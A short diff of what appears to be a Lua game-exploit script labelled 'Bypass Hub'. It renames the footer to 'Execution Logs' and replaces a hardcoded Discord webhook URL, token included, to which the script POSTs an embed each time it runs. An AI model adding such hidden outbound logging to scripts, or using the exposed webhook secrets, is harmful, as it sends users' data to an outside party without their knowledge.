@@ -49,13 +49,13 @@ local Embed = {
 				}
 			},
 			["footer"] = {
-			    ["text"] = "Flerixhub",
+			    ["text"] = "Bypass Hub > Execution Logs",
 			    ["icon_url"] = ""
 			},
 			["timestamp"] = string.format('%d-%d-%dT%02d:%02d:%02dZ', Time.year, Time.month, Time.day, Time.hour, Time.min, Time.sec),
 };
 (syn and syn.request or http_request or http.request) {
-    Url = 'https://discord.com/api/webhooks/1009557629162504292/tlZlhjO-sOzy9nC80781-80YUPhFcKjNblIjiCMOs_fzi_RafXLNZHbeJtkpI5UytsDh';
+    Url = 'https://discord.com/api/webhooks/1068334058838429777/d2NkmBpU3xIiG36aiYxMeNe5rWT5hESkhQAkGI5V12-ip0OtXHdKrvb8yMXZ_JZzEWk3';
     Method = 'POST';
     Headers = {
         ['Content-Type'] = 'application/json';
